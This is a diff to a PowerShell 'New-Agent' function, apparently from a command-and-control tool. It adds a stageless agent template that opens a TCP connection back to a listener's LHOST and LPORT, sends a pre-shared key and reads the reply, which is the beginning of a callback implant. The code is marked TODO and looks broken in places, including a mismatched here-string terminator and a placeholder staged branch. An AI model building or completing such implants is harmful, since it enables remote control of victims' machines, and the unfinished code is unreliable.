@@ -6,29 +6,43 @@ Function Global:New-Agent()
     [CmdletBinding()]
     param
     (
-		# read only
+		[Parameter()]
+		[String]$Listerner,
+
 		[Parameter()]
 		[ValidateSet("Staged","Stageless")]
-		[Object]$Type,
+		[String]$StageType
 
-		[Parameter()]
-		[String]$LHOST,
 
-		[Parameter()]
-		[INT]$LPORT
     )
-
 
 
 	Process
 	{
-		if($Type -eq "Staged")
+		
+		if($StageType -eq "Staged")
 		{
 			"Oneliner here"
 		}
 
-		if($Type -eq "Stageless")
+		if($StageType -eq "Stageless")
 		{
+				$PSK = ($Listerner.PSK)
+
+				$Agent = @'
+					TODO:::::
+					$PSK = $PSK
+					$tcp = New-Object System.Net.Sockets.TcpClient; 
+					$tcp.connect('$Listerner.LHOST', $Listerner.LPORT); 
+
+					$tcpStream = $tcp.GetStream()
+					$reader = New-Object System.IO.StreamReader($tcpStream)
+					$writer = New-Object System.IO.StreamWriter($tcpStream)
+					$writer.WriteLine($PSK);
+					$reader.ReadLine()
+			'
+			
+
 			
 		}
 		
